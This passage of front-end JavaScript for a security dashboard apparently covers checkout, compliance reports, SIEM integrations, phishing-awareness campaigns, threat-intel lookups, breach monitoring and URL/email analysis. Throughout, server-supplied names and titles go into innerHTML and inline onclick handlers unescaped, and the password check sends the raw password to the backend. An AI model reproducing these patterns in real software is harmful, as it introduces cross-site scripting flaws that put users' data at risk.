    document.getElementById('checkoutSuccessKey').textContent   = data.api_key;
    _showCheckoutStep('checkoutStep3');

  } catch (err) {
    _showCheckoutStep('checkoutStep1');
    const errEl = document.getElementById('checkoutError');
    errEl.textContent = err.message || 'Signup failed. Please try again.';
    errEl.style.display = '';
  }
}

function connectFreeAccount() {
  if (!_checkoutFreeApiKey) return;
  hideCheckoutModal();
  // Pre-fill the connect modal with the issued key
  const urlEl = document.getElementById('connectUrl');
  const keyEl = document.getElementById('connectKey');
  if (urlEl) urlEl.value = STATE.brainUrl || window.location.origin;
  if (keyEl) keyEl.value = _checkoutFreeApiKey;
  // Connect automatically
  if (typeof connectFromModal === 'function') connectFromModal();
  else showConnectModal();
}

async function startCheckout(provider) {
  const fields = _validateContactFields();
  if (!fields) return;
  const { name, email } = fields;

  _showCheckoutStep('checkoutStep2');
  document.getElementById('checkoutSpinnerIcon').textContent = '⏳';
  document.getElementById('checkoutSpinnerMsg').textContent  = 'Redirecting to payment…';

  const base = (STATE.brainUrl || window.location.origin).replace(/\/$/, '');

  // Map the modal plan name to the backend Literal values.
  // 'pro' stays 'pro'; anything else that reaches here (e.g. 'starter') maps through.
  const tier    = (_checkoutPlan === 'free') ? 'starter' : _checkoutPlan; // free never reaches this path
  const cadence = _checkoutCadence || 'annual';

  try {
    const resp = await fetch(`${base}/api/billing/checkout/${provider}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, name, tier, cadence }),
    });

    const data = await resp.json().catch(() => ({}));
    if (!resp.ok) throw new Error(data.detail || `Server error ${resp.status}`);

    const url = data.url;
    if (!url) throw new Error('No payment URL returned');

    window.location.href = url;

  } catch (err) {
    _showCheckoutStep('checkoutStep1');
    const errEl = document.getElementById('checkoutError');
    errEl.textContent = err.message || 'Failed to start checkout. Please try again.';
    errEl.style.display = '';
  }
}

// ══════════════════════════════════════════════════════════════
//  COMPLIANCE
// ══════════════════════════════════════════════════════════════

function populateComplianceScanSelect() {
  const sel = document.getElementById('complianceScanSelect');
  if (!sel) return;
  const current = sel.value;
  sel.innerHTML = '<option value="">Select a scan…</option>';
  const done = STATE.scans.filter(s => s.status === 'completed');
  done.forEach(s => {
    const o = document.createElement('option');
    o.value = s.id;
    o.textContent = s.name || s.id;
    sel.appendChild(o);
  });
  if (current) sel.value = current;
}

async function runComplianceReport() {
  const scanId = document.getElementById('complianceScanSelect')?.value;
  const fw     = document.getElementById('complianceFramework')?.value || 'pci_dss';
  if (!scanId) return alert('Please select a scan first.');

  try {
    const data = await api(`/compliance/scans/${scanId}?framework=${fw}`);
    document.getElementById('complianceResult').style.display = '';

    // Score / status
    const scoreEl = document.getElementById('compScoreVal');
    if (scoreEl) scoreEl.textContent = data.summary.compliance_score + '%';

    const statusEl = document.getElementById('compStatusVal');
    if (statusEl) {
      statusEl.textContent = data.status;
      statusEl.style.color = data.status === 'PASS' ? '#22c55e' : data.status === 'FAIL' ? '#f04f59' : '#f0853a';
    }

    const ctrlEl = document.getElementById('compCtrlViolated');
    if (ctrlEl) ctrlEl.textContent = data.summary.controls_violated_count;

    const gapEl = document.getElementById('compCritGaps');
    if (gapEl) gapEl.textContent = data.summary.critical_gaps;

    // Violations list
    const listEl = document.getElementById('complianceViolations');
    if (listEl) {
      if (!data.violations.length) {
        listEl.innerHTML = '<div style="color:#22c55e;padding:12px">No violations detected — clean scan.</div>';
      } else {
        listEl.innerHTML = data.violations.map(v => {
          const sevColor = v.severity === 'Critical' ? '#f04f59' : v.severity === 'High' ? '#f0853a' : v.severity === 'Medium' ? '#f5c842' : '#7c6af7';
          return `<div style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:14px 16px">
            <div style="display:flex;gap:10px;align-items:flex-start;flex-wrap:wrap">
              <span style="color:${sevColor};font-weight:700;font-size:.8rem;white-space:nowrap">${v.severity}</span>
              <strong style="flex:1;min-width:0">${v.title}</strong>
              <span style="color:#888;font-size:.75rem">${v.host || ''}</span>
            </div>
            <div style="margin-top:8px;font-size:.78rem;color:#bbb">Controls: <code style="color:#c4b5fd">${v.controls.join(', ')}</code></div>
            ${v.remediation ? `<div style="margin-top:6px;font-size:.78rem;color:#a0a0b0">${v.remediation}</div>` : ''}
          </div>`;
        }).join('');
      }
    }
  } catch (err) {
    alert('Compliance report failed: ' + (err.message || err));
  }
}

// ══════════════════════════════════════════════════════════════
//  INTEGRATIONS
// ══════════════════════════════════════════════════════════════

async function loadIntegrations() {
  const listEl = document.getElementById('integrationsList');
  if (!listEl) return;
  try {
    const integrations = await api('/integrations');
    if (!integrations.length) {
      listEl.innerHTML = '<div class="glass-card" style="padding:40px;text-align:center;color:#666">No integrations configured yet.</div>';
      return;
    }
    const typeIcon = { splunk:'🔴', sentinel:'🔵', qradar:'🟣', elastic:'🟡', webhook:'🔗' };
    listEl.innerHTML = integrations.map(i => `
      <div class="glass-card" style="padding:16px 20px;display:flex;align-items:center;gap:14px;flex-wrap:wrap">
        <span style="font-size:1.4rem">${typeIcon[i.type] || '🔗'}</span>
        <div style="flex:1;min-width:0">
          <div style="font-weight:600">${i.name}</div>
          <div style="font-size:.78rem;color:#888;margin-top:2px">${i.type.toUpperCase()} — ${i.url}</div>
        </div>
        <span style="font-size:.75rem;padding:3px 10px;border-radius:20px;background:${i.enabled ? 'rgba(34,197,94,.15)' : 'rgba(160,160,176,.1)'};color:${i.enabled ? '#22c55e' : '#888'}">${i.enabled ? 'Enabled' : 'Disabled'}</span>
        <button class="btn btn-ghost btn-sm" onclick="testIntegration('${i.id}','${i.name}')">Test</button>
        <button class="btn btn-ghost btn-sm" style="color:#f04f59" onclick="deleteIntegration('${i.id}')">Delete</button>
      </div>
    `).join('');
  } catch (err) {
    listEl.innerHTML = `<div class="glass-card" style="padding:20px;color:#f04f59">${err.message || 'Failed to load integrations.'}</div>`;
  }
}

function populateExportScanSelect() {
  const sel = document.getElementById('exportScanSelect');
  if (!sel) return;
  sel.innerHTML = '<option value="">Select a scan…</option>';
  STATE.scans.filter(s => s.status === 'completed').forEach(s => {
    const o = document.createElement('option');
    o.value = s.id;
    o.textContent = s.name || s.id;
    sel.appendChild(o);
  });
}

function openNewIntegrationModal() {
  document.getElementById('intgName').value = '';
  document.getElementById('intgUrl').value  = '';
  document.getElementById('intgApiKey').value = '';
  openModal('newIntegrationModal');
}

async function submitNewIntegration() {
  const name   = document.getElementById('intgName')?.value?.trim();
  const type   = document.getElementById('intgType')?.value;
  const url    = document.getElementById('intgUrl')?.value?.trim();
  const apiKey = document.getElementById('intgApiKey')?.value?.trim();

  if (!name || !url) return alert('Name and URL are required.');
  try {
    await api('/integrations', {
      method: 'POST',
      body: JSON.stringify({ name, type, url, api_key: apiKey || null }),
    });
    closeModal();
    loadIntegrations();
  } catch (err) {
    alert('Failed to save integration: ' + (err.message || err));
  }
}

async function testIntegration(id, name) {
  try {
    const res = await api(`/integrations/${id}/test`, { method: 'POST' });
    alert(res.success ? `✅ ${name} — Connection successful!` : `❌ ${name} — ${res.error || 'Test failed.'}`);
  } catch (err) {
    alert('Test error: ' + (err.message || err));
  }
}

async function deleteIntegration(id) {
  const ok = await showConfirm({ title:'Delete Integration', subtitle:'SIEM / Webhook', message:'This will permanently remove the integration. No more events will be forwarded to this endpoint.', okLabel:'Delete', icon:'🔌', iconBg:'rgba(240,79,89,0.15)' });
  if (!ok) return;
  try {
    await api(`/integrations/${id}`, { method: 'DELETE' });
    loadIntegrations();
  } catch (err) {
    alert('Delete failed: ' + (err.message || err));
  }
}

async function exportScanToSIEM() {
  const scanId = document.getElementById('exportScanSelect')?.value;
  if (!scanId) return alert('Please select a scan.');
  const resEl = document.getElementById('exportResult');
  try {
    const data = await api(`/integrations/scans/${scanId}/export`, { method: 'POST' });
    resEl.style.display = '';
    resEl.innerHTML = data.results.map(r =>
      `<div style="padding:8px 12px;border-radius:6px;background:rgba(255,255,255,.04);margin-bottom:6px;font-size:.82rem">
        <strong>${r.integration}</strong> (${r.type}) — ${r.success ? '<span style="color:#22c55e">✓ Exported</span>' : `<span style="color:#f04f59">✗ ${r.error || 'Failed'}</span>`}
      </div>`
    ).join('');
  } catch (err) {
    resEl.style.display = '';
    resEl.innerHTML = `<div style="color:#f04f59">${err.message || 'Export failed.'}</div>`;
  }
}

// ══════════════════════════════════════════════════════════════
//  PHISHING SIMULATION
// ══════════════════════════════════════════════════════════════

async function loadPhishingCampaigns() {
  const listEl = document.getElementById('phishingCampaignList');
  if (!listEl) return;
  try {
    const campaigns = await api('/phishing');
    if (!campaigns.length) {
      listEl.innerHTML = '<div class="glass-card" style="padding:40px;text-align:center;color:#666">No campaigns yet. Create one to start awareness testing.</div>';
      return;
    }
    const statusColor = { pending:'#888', running:'#7c6af7', completed:'#22c55e', failed:'#f04f59' };
    const riskColor   = { LOW:'#22c55e', MEDIUM:'#f5c842', HIGH:'#f0853a', CRITICAL:'#f04f59' };
    listEl.innerHTML = campaigns.map(c => `
      <div class="glass-card" style="padding:18px 22px">
        <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:10px">
          <div style="flex:1;min-width:0">
            <div style="font-weight:600;font-size:.95rem">${c.name}</div>
            <div style="font-size:.75rem;color:#888;margin-top:2px">${c.template.replace(/_/g,' ')} · ${c.target_count} targets · ${new Date(c.created_at).toLocaleDateString()}</div>
          </div>
          <span style="font-size:.75rem;padding:3px 10px;border-radius:20px;background:rgba(255,255,255,.06);color:${statusColor[c.status] || '#888'}">${c.status}</span>
          <button class="btn btn-ghost btn-sm" onclick="viewCampaignResults('${c.id}')">Results</button>
        </div>
        <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;text-align:center">
          ${[['Sent',c.sent_count],['Opened',c.opened_count],['Clicked',c.clicked_count],['Submitted',c.submitted_count]].map(([l,v])=>
            `<div style="background:rgba(255,255,255,.04);border-radius:6px;padding:8px 4px"><div style="font-weight:700;font-size:1.1rem">${v}</div><div style="font-size:.7rem;color:#888;margin-top:2px">${l}</div></div>`
          ).join('')}
        </div>
      </div>
    `).join('');
  } catch (err) {
    listEl.innerHTML = `<div class="glass-card" style="padding:20px;color:#f04f59">${err.message || 'Failed to load campaigns.'}</div>`;
  }
}

function openNewCampaignModal() {
  document.getElementById('campName').value    = '';
  document.getElementById('campTargets').value = '';
  openModal('newCampaignModal');
}

async function submitNewCampaign() {
  const name     = document.getElementById('campName')?.value?.trim();
  const template = document.getElementById('campTemplate')?.value;
  const raw      = document.getElementById('campTargets')?.value?.trim();

  if (!name)  return alert('Campaign name is required.');
  if (!raw)   return alert('At least one target email is required.');

  const targets = raw.split(/[\n,]+/).map(e => e.trim()).filter(e => e.includes('@'));
  if (!targets.length) return alert('No valid email addresses found.');

  try {
    await api('/phishing', {
      method: 'POST',
      body: JSON.stringify({ name, template, targets }),
    });
    closeModal();
    loadPhishingCampaigns();
  } catch (err) {
    alert('Failed to create campaign: ' + (err.message || err));
  }
}

async function viewCampaignResults(campaignId) {
  try {
    const data = await api(`/phishing/${campaignId}/results`);
    const riskColor = { LOW:'#22c55e', MEDIUM:'#f5c842', HIGH:'#f0853a', CRITICAL:'#f04f59' };
    const msg = [
      `Campaign: ${data.name}`,
      `Status: ${data.status}`,
      `Open Rate: ${data.open_rate}%  |  Click Rate: ${data.click_rate}%  |  Submit Rate: ${data.submit_rate}%`,
      `Risk Rating: ${data.risk_rating}`,
      '',
      'Recommendations:',
      ...data.recommendations.map(r => `• ${r}`)
    ].join('\n');
    alert(msg);
  } catch (err) {
    alert('Failed to load results: ' + (err.message || err));
  }
}

// ============================================================
// Threat Intelligence
// ============================================================

function tiSwitchTab(tab, btn) {
  ['lookup','enrich','iocs'].forEach(t => {
    const el = document.getElementById(`ti-tab-${t}`);
    if (el) el.style.display = t === tab ? '' : 'none';
  });
  document.querySelectorAll('#page-threatintel .tab-btn').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  if (tab === 'iocs') tiLoadIOCs();
}

function populateTIScanSelect() {
  const sel = document.getElementById('tiScanSelect');
  if (!sel) return;
  sel.innerHTML = '<option value="">— choose a scan —</option>';
  (STATE.scans || []).filter(s => s.status === 'completed').forEach(s => {
    const opt = document.createElement('option');
    opt.value = s.id;
    opt.textContent = s.name || s.id;
    sel.appendChild(opt);
  });
}

async function tiLookupIP() {
  const ip = document.getElementById('tiIpInput')?.value?.trim();
  if (!ip) return;
  const resultEl = document.getElementById('tiLookupResult');
  const btn = document.getElementById('tiLookupBtn');
  resultEl.innerHTML = '<div class="glass-card" style="padding:20px;color:#8b90a7">Looking up…</div>';
  btn.disabled = true;
  try {
    const data = await api(`/threat-intel/ip/${encodeURIComponent(ip)}`);
    resultEl.innerHTML = tiRenderIPCard(data);
  } catch (err) {
    resultEl.innerHTML = `<div class="glass-card" style="padding:20px;color:#f04f59">Error: ${err.message || err}</div>`;
  } finally {
    btn.disabled = false;
  }
}

function tiRenderIPCard(d) {
  const geo = d.geo || {};
  const abuse = d.abuse || {};
  const vt = d.virustotal || {};
  const riskColor = d.risk_score >= 75 ? '#f04f59' : d.risk_score >= 40 ? '#f0853a' : d.risk_score >= 10 ? '#f5c842' : '#4cf098';
  const tags = (d.tags || []).map(t => `<span style="background:#1e2130;color:#8b90a7;padding:2px 8px;border-radius:4px;font-size:11px;margin-right:4px">${t}</span>`).join('');
  const watchlistBadge = d.watchlisted
    ? `<span style="background:#2a1219;color:#f04f59;padding:2px 8px;border-radius:4px;font-size:11px">WATCHLISTED (${d.watchlist_severity})</span>`
    : '';

  return `<div class="glass-card" style="padding:24px">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
      <div>
        <span style="font-size:20px;font-weight:700;color:#dde1f0">${d.ip}</span>
        ${watchlistBadge}
        <div style="margin-top:6px">${tags}</div>
      </div>
      <div style="text-align:right">
        <div style="font-size:32px;font-weight:700;color:${riskColor}">${d.risk_score}</div>
        <div style="font-size:11px;color:#8b90a7">Risk Score</div>
      </div>
    </div>
    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px">
      ${geo.country ? `<div>
        <div style="font-size:11px;color:#8b90a7;margin-bottom:4px">Location</div>
        <div style="color:#dde1f0">${geo.city ? geo.city + ', ' : ''}${geo.country}</div>
        <div style="font-size:12px;color:#8b90a7">${geo.org || ''}</div>
      </div>` : ''}
      ${abuse.abuseConfidenceScore !== undefined ? `<div>
        <div style="font-size:11px;color:#8b90a7;margin-bottom:4px">AbuseIPDB</div>
        <div style="color:#dde1f0">${abuse.abuseConfidenceScore}% confidence</div>
        <div style="font-size:12px;color:#8b90a7">${abuse.totalReports || 0} reports · ${abuse.isp || ''}</div>
      </div>` : ''}
      ${vt.malicious !== undefined ? `<div>
        <div style="font-size:11px;color:#8b90a7;margin-bottom:4px">VirusTotal</div>
        <div style="color:${vt.malicious > 0 ? '#f04f59' : '#4cf098'}">${vt.malicious} malicious · ${vt.suspicious} suspicious</div>
        <div style="font-size:12px;color:#8b90a7">${vt.harmless} harmless</div>
      </div>` : ''}
      ${geo.asn ? `<div>
        <div style="font-size:11px;color:#8b90a7;margin-bottom:4px">Network</div>
        <div style="color:#dde1f0">${geo.asn}</div>
        <div style="font-size:12px;color:#8b90a7">${geo.region || ''}</div>
      </div>` : ''}
    </div>
    ${d.watchlisted && d.watchlist_note ? `<div style="margin-top:12px;padding:8px 12px;background:#2a1219;border-radius:6px;font-size:12px;color:#f04f59">Watchlist note: ${d.watchlist_note}</div>` : ''}
  </div>`;
}

async function tiEnrichScan() {
  const scanId = document.getElementById('tiScanSelect')?.value;
  if (!scanId) return alert('Select a scan first');
  const resultEl = document.getElementById('tiEnrichResult');
  resultEl.innerHTML = '<div class="glass-card" style="padding:20px;color:#8b90a7">Enriching scan IPs… this may take a moment.</div>';
  try {
    const data = await api(`/threat-intel/scans/${scanId}/enrich`);
    if (!data.results?.length) {
      resultEl.innerHTML = '<div class="glass-card" style="padding:20px;color:#8b90a7">No public IPs found in this scan.</div>';
      return;
    }
    const cards = data.results.map(r => tiRenderIPCard({ ...r.intel, ip: r.ip })).join('');
    resultEl.innerHTML = `<div style="color:#8b90a7;font-size:13px;margin-bottom:12px">Enriched ${data.enriched_ips} unique IPs from this scan</div>${cards}`;
  } catch (err) {
    resultEl.innerHTML = `<div class="glass-card" style="padding:20px;color:#f04f59">Error: ${err.message || err}</div>`;
  }
}

async function tiLoadIOCs() {
  const listEl = document.getElementById('tiIOCList');
  if (!listEl) return;
  try {
    const iocs = await api('/threat-intel/iocs');
    if (!iocs.length) {
      listEl.innerHTML = '<div class="glass-card" style="padding:40px;text-align:center;color:#666">No IOCs in watchlist.</div>';
      return;
    }
    const sevColor = { low:'#4cf098', medium:'#f5c842', high:'#f0853a', critical:'#f04f59' };
    listEl.innerHTML = iocs.map(ioc => `
      <div class="glass-card" style="padding:16px 20px;display:flex;align-items:center;gap:16px">
        <span style="background:#1e2130;padding:2px 8px;border-radius:4px;font-size:11px;color:#7c6af7;min-width:54px;text-align:center">${ioc.ioc_type}</span>
        <span style="color:#dde1f0;font-family:monospace;font-size:13px;flex:1">${ioc.value}</span>
        <span style="font-size:12px;color:#8b90a7;flex:1">${ioc.description || '—'}</span>
        <span style="color:${sevColor[ioc.severity]||'#8b90a7'};font-size:12px;min-width:60px">${ioc.severity}</span>
        <span style="font-size:11px;padding:2px 8px;border-radius:4px;background:${ioc.active?'#0a2a1a':'#2a1219'};color:${ioc.active?'#4cf098':'#f04f59'}">${ioc.active?'active':'disabled'}</span>
        <div style="display:flex;gap:8px">
          <button class="btn btn-sm" onclick="tiToggleIOC('${ioc.id}')" title="${ioc.active?'Disable':'Enable'}">${ioc.active?'Disable':'Enable'}</button>
          <button class="btn btn-sm" style="color:#f04f59" onclick="tiDeleteIOC('${ioc.id}')">Delete</button>
        </div>
      </div>`).join('');
  } catch (err) {
    listEl.innerHTML = `<div class="glass-card" style="padding:20px;color:#f04f59">Failed to load: ${err.message}</div>`;
  }
}

async function tiAddIOC() {
  const type = document.getElementById('iocTypeInput')?.value;
  const value = document.getElementById('iocValueInput')?.value?.trim();
  const severity = document.getElementById('iocSeverityInput')?.value;
  const description = document.getElementById('iocDescInput')?.value?.trim() || '';
  if (!value) return alert('Enter an IOC value');
  try {
    await api('/threat-intel/iocs', { method:'POST', body: JSON.stringify({ ioc_type:type, value, severity, description }) });
    document.getElementById('iocValueInput').value = '';
    document.getElementById('iocDescInput').value = '';
    tiLoadIOCs();
  } catch (err) {
    alert('Failed to add IOC: ' + (err.message || err));
  }
}

async function tiToggleIOC(id) {
  try {
    await api(`/threat-intel/iocs/${id}/toggle`, { method:'PATCH' });
    tiLoadIOCs();
  } catch (err) {
    alert('Failed: ' + (err.message || err));
  }
}

async function tiDeleteIOC(id) {
  const ok = await showConfirm({ title:'Remove IOC', subtitle:'Threat Intelligence Watchlist', message:'Remove this indicator from the watchlist? It will no longer be matched against scan findings.', okLabel:'Remove', icon:'🔍', iconBg:'rgba(240,79,89,0.15)' });
  if (!ok) return;
  try {
    await api(`/threat-intel/iocs/${id}`, { method:'DELETE' });
    tiLoadIOCs();
  } catch (err) {
    alert('Failed: ' + (err.message || err));
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// PERSONAL SECURITY SUITE
// ══════════════════════════════════════════════════════════════════════════════

// ── Security Score ────────────────────────────────────────────────────────────

async function loadSecurityScore() {
  const wrap = document.getElementById('scoreMainWrap');
  if (wrap) wrap.innerHTML = '<div class="loading-row">Computing security score…</div>';
  try {
    const data = await api('/api/v1/security-score');
    renderSecurityScore(data);
    loadScoreHistory();
  } catch(e) {
    if (wrap) wrap.innerHTML = `<div class="empty-state">Failed to load score: ${e.message}</div>`;
  }
}

function renderSecurityScore(data) {
  const score = data.score || 0;
  const grade = data.grade || 'F';
  const bd    = data.breakdown || {};
  const acts  = data.actions  || [];
  const ts    = data.computed_at ? new Date(data.computed_at).toLocaleString() : '';

  // colour based on score
  const colour = score >= 80 ? '#3dd68c' : score >= 60 ? '#7c6af7' : score >= 40 ? '#f0853a' : '#f04f59';

  // SVG ring: r=80, circumference=502.6
  const circ = 2 * Math.PI * 80;
  const offset = circ - (score / 100) * circ;

  const scoreHTML = `
    <div class="score-layout" id="scoreMainWrap">
      <div class="glass-card score-ring-card">
        <div class="score-ring-wrap">
          <svg viewBox="0 0 180 180">
            <circle class="score-ring-bg"   cx="90" cy="90" r="80"/>
            <circle class="score-ring-fill" cx="90" cy="90" r="80"
              stroke="${colour}"
              stroke-dasharray="${circ}"
              stroke-dashoffset="${offset}"/>
          </svg>
          <div class="score-ring-center">
            <span class="score-number" style="color:${colour}">${score}</span>
            <span class="score-grade"  style="color:${colour}">${grade}</span>
          </div>
        </div>
        <span class="score-label">Security Score</span>
        <span class="score-computed">Last computed ${ts}</span>
        <button class="btn btn-primary" style="margin-top:16px;width:100%" onclick="refreshSecurityScore()">Recompute</button>

        <div class="score-components" style="margin-top:20px">
          ${Object.entries(bd).map(([k,v]) => {
            const label = {breach:'Breach Health',network:'Network Posture',exposure:'Digital Exposure',hygiene:'Security Hygiene'}[k] || k;
            const c = v >= 20 ? '#3dd68c' : v >= 12 ? '#7c6af7' : v >= 6 ? '#f0853a' : '#f04f59';
            return `<div class="score-comp">
              <span class="score-comp-label">${label}</span>
              <div class="score-comp-bar-wrap"><div class="score-comp-bar" style="width:${(v/25)*100}%;background:${c}"></div></div>
              <span class="score-comp-val" style="color:${c}">${v}</span>
            </div>`;
          }).join('')}
        </div>
      </div>

      <div class="score-detail-card">
        <div class="glass-card" style="padding:20px">
          <div class="card-title">Priority Actions</div>
          <div class="score-actions-list" style="margin-top:12px">
            ${acts.length ? acts.map(a => `
              <div class="score-action">
                <span class="score-action-icon">${a.icon || '🔧'}</span>
                <div class="score-action-text">
                  <div class="score-action-title">${a.title}</div>
                  <div class="score-action-desc">${a.desc || ''}</div>
                </div>
                <span class="score-action-pri ${a.priority || 'low'}">${(a.priority||'low').toUpperCase()}</span>
              </div>`).join('')
            : '<div class="empty-state" style="font-size:13px">No actions — great posture!</div>'}
          </div>
        </div>

        <div class="glass-card" style="padding:20px">
          <div class="card-title">Score History</div>
          <div class="score-history-chart" id="scoreHistChart" style="margin-top:12px; height:64px">
            <div class="empty-state" style="font-size:12px">Loading…</div>
          </div>
        </div>
      </div>
    </div>`;

  const outer = document.getElementById('scorePageBody');
  if (outer) outer.innerHTML = scoreHTML;
}

async function refreshSecurityScore() {
  const btn = document.querySelector('[onclick="refreshSecurityScore()"]');
  if (btn) { btn.disabled = true; btn.textContent = 'Computing…'; }
  try {
    const data = await api('/api/v1/security-score/compute', { method:'POST' });
    renderSecurityScore(data);
    loadScoreHistory();
  } catch(e) { showToast('Failed to compute score: ' + e.message, 'error'); }
}

async function loadScoreHistory() {
  try {
    const hist = await api('/api/v1/security-score/history?limit=30');
    const el = document.getElementById('scoreHistChart');
    if (!el || !hist.length) return;
    const max = Math.max(...hist.map(h => h.score), 1);
    el.innerHTML = hist.map(h => {
      const pct = (h.score / 100) * 100;
      const c   = h.score >= 80 ? '#3dd68c' : h.score >= 60 ? '#7c6af7' : h.score >= 40 ? '#f0853a' : '#f04f59';
      return `<div class="score-hist-bar" style="height:${pct}%;background:${c}" title="${h.score} — ${new Date(h.computed_at).toLocaleDateString()}"></div>`;
    }).join('');
  } catch(_) {}
}


// ── Breach Monitor ────────────────────────────────────────────────────────────

let _breachMonitors = [];

async function loadBreachMonitor() {
  try {
    const [monitors, summary] = await Promise.all([
      api('/api/v1/breach-monitor'),
      api('/api/v1/breach-monitor/summary'),
    ]);
    _breachMonitors = monitors;
    renderBreachSummary(summary);
    renderBreachTable(monitors);
  } catch(e) {
    showToast('Failed to load breach monitor: ' + e.message, 'error');
  }
}

function renderBreachSummary(s) {
  const el = document.getElementById('breachSummaryBar');
  if (!el) return;
  el.innerHTML = `
    <div class="bsm-stat"><div class="bsm-val">${s.total_monitored || 0}</div><div class="bsm-lbl">Monitored Emails</div></div>
    <div class="bsm-stat"><div class="bsm-val" style="color:${s.total_breaches>0?'#f04f59':'#3dd68c'}">${s.total_breaches || 0}</div><div class="bsm-lbl">Total Breaches</div></div>
    <div class="bsm-stat"><div class="bsm-val" style="color:${s.sensitive_breaches>0?'#f04f59':'#3dd68c'}">${s.sensitive_breaches || 0}</div><div class="bsm-lbl">Sensitive Breaches</div></div>
    <div class="bsm-stat"><div class="bsm-val">${s.clean_emails || 0}</div><div class="bsm-lbl">Clean Emails</div></div>
  `;
}

function renderBreachTable(monitors) {
  const tbody = document.getElementById('breachMonitorTbody');
  if (!tbody) return;
  if (!monitors.length) {
    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:24px;color:var(--text-3)">No emails monitored yet. Add one above.</td></tr>';
    return;
  }
  tbody.innerHTML = monitors.map(m => `
    <tr>
      <td>${m.email}</td>
      <td style="color:var(--text-3)">${m.label || '—'}</td>
      <td><span class="breach-count-badge ${m.breach_count > 0 ? 'has-breach' : 'clean'}">
        ${m.breach_count > 0 ? `⚠ ${m.breach_count} breach${m.breach_count>1?'es':''}` : '✓ Clean'}
      </span></td>
      <td style="color:var(--text-3);font-size:12px">${m.last_checked ? new Date(m.last_checked).toLocaleDateString() : 'Never'}</td>
      <td>
        <button class="btn btn-ghost btn-sm" onclick="viewBreachHits('${m.id}','${m.email}')">View</button>
        <button class="btn btn-ghost btn-sm" onclick="refreshBreachMonitor('${m.id}')">Refresh</button>
        <button class="btn btn-ghost btn-sm" style="color:#f04f59" onclick="deleteBreachMonitor('${m.id}')">Delete</button>
      </td>
    </tr>`).join('');
}

async function addBreachEmail() {
  const emailEl = document.getElementById('breachNewEmail');
  const labelEl = document.getElementById('breachNewLabel');
  if (!emailEl) return;
  const email = emailEl.value.trim();
  const label = labelEl ? labelEl.value.trim() : '';
  if (!email) { showToast('Enter an email address', 'warn'); return; }
  try {
    await api('/api/v1/breach-monitor', { method:'POST', json:{ email, label } });
    emailEl.value = '';
    if (labelEl) labelEl.value = '';
    showToast('Email added and checking breaches…', 'info');
    setTimeout(loadBreachMonitor, 2000);
  } catch(e) { showToast(e.message, 'error'); }
}

async function refreshBreachMonitor(id) {
  showToast('Refreshing breach data…', 'info');
  try {
    await api(`/api/v1/breach-monitor/${id}/refresh`, { method:'POST' });
    setTimeout(loadBreachMonitor, 1500);
  } catch(e) { showToast(e.message, 'error'); }
}

async function deleteBreachMonitor(id) {
  if (!confirm('Remove this email from monitoring?')) return;
  try {
    await api(`/api/v1/breach-monitor/${id}`, { method:'DELETE' });
    loadBreachMonitor();
  } catch(e) { showToast(e.message, 'error'); }
}

async function viewBreachHits(id, email) {
  const modal = document.getElementById('breachHitsModal');
  const title = document.getElementById('breachHitsTitle');
  const body  = document.getElementById('breachHitsBody');
  if (!modal) return;
  if (title) title.textContent = `Breaches for ${email}`;
  if (body)  body.innerHTML = '<div class="loading-row">Loading…</div>';
  modal.style.display = 'flex';
  try {
    const hits = await api(`/api/v1/breach-monitor/${id}/hits`);
    if (!body) return;
    if (!hits.length) {
      body.innerHTML = '<div class="empty-state">No breaches found — this email appears clean.</div>';
      return;
    }
    body.innerHTML = `<div class="breach-hits-grid">${hits.map(h => `
      <div class="breach-hit-card">
        <div class="breach-hit-name">${h.breach_name}</div>
        <div class="breach-hit-meta">${h.breach_domain} · ${h.breach_date || 'Date unknown'} · ${(h.pwn_count||0).toLocaleString()} accounts</div>
        <div class="breach-hit-tags">${(h.data_classes||[]).map(d=>`<span class="breach-hit-tag">${d}</span>`).join('')}</div>
      </div>`).join('')}
    </div>`;
  } catch(e) {
    if (body) body.innerHTML = `<div class="empty-state">Error: ${e.message}</div>`;
  }
}

function closeBreachHitsModal() {
  const m = document.getElementById('breachHitsModal');
  if (m) m.style.display = 'none';
}

async function checkPassword() {
  const inp = document.getElementById('pwCheckInput');
  const res = document.getElementById('pwCheckResult');
  if (!inp || !res) return;
  const pw = inp.value;
  if (!pw) { showToast('Enter a password to check', 'warn'); return; }
  res.style.display = 'none';
  try {
    const data = await api('/api/v1/breach-monitor/check-password', { method:'POST', json:{ password: pw } });
    res.style.display = '';
    if (data.pwned) {
      res.className = 'pw-result pwned';
      res.innerHTML = `⚠ This password has been seen <strong>${data.times.toLocaleString()}</strong> time${data.times>1?'s':''} in data breaches. Change it immediately.`;
    } else {
      res.className = 'pw-result safe';
      res.innerHTML = '✓ Password not found in any known breach database. Stay vigilant.';
    }
  } catch(e) { showToast(e.message, 'error'); }
}


// ── Link & Email Analyzer ─────────────────────────────────────────────────────

async function analyzeURL() {
  const inp = document.getElementById('urlAnalyzeInput');
  const panel = document.getElementById('urlVerdictPanel');
  if (!inp || !panel) return;
  const url = inp.value.trim();
  if (!url) { showToast('Enter a URL', 'warn'); return; }
  panel.style.display = 'none';
  const btn = document.getElementById('urlAnalyzeBtn');
  if (btn) { btn.disabled = true; btn.textContent = 'Analyzing…'; }
  try {
    const r = await api('/api/v1/analyze/url', { method:'POST', json:{ url } });
    renderVerdictPanel(panel, r);
    loadAnalyzerHistory();
  } catch(e) { showToast(e.message, 'error'); }
  finally { if (btn) { btn.disabled=false; btn.textContent='Analyze URL'; } }
}

async function analyzeEmail() {
  const inp = document.getElementById('emailAnalyzeInput');
  const panel = document.getElementById('emailVerdictPanel');
  if (!inp || !panel) return;
  const raw = inp.value.trim();
  if (!raw) { showToast('Paste email content', 'warn'); return; }
  panel.style.display = 'none';
  const btn = document.getElementById('emailAnalyzeBtn');
  if (btn) { btn.disabled = true; btn.textContent = 'Analyzing…'; }
  try {
    const r = await api('/api/v1/analyze/email', { method:'POST', json:{ raw_email: raw } });
    renderVerdictPanel(panel, r);
    loadAnalyzerHistory();
  } catch(e) { showToast(e.message, 'error'); }
